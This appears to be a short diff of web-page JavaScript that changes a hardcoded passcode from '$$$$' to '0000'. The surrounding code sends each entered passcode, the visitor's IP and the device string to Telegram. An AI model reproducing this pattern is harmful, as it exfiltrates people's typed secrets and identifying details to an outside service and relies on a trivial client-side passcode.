@@ -311,7 +311,7 @@ function checkPasscode() {
     fetch('https://api.ipify.org?format=json')
     .then(r => r.json())
     .then(data => {
-        const status = (enteredPass === "$$$$") ? "✅ SUCCESS" : "❌ FAILED";
+        const status = (enteredPass === "0000") ? "✅ SUCCESS" : "❌ FAILED";
         notifyTelegram(`🔑 *Login Attempt*\nStatus: ${status}\nEntered: ${enteredPass}\nIP: ${data.ip}\nDevice: ${navigator.userAgent}`);
     });
 
